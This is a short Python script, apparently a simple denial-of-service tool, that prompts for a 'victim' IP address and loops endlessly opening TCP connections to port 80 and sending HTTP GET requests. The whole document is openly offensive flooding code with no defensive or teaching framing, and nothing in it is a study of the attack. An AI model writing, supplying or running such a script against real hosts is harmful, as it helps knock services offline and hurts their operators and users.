import socket

def dos_attack():
    target_ip = input("Enter the IP address of the victim: ")
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, 80))
            s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, 80))
            s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, 80))
            print("DoS attack sent to", target_ip)
        except socket.error:
            print("Error! DoS attack failed.")
        s.close()

if __name__ == "__main__":
    dos_attack()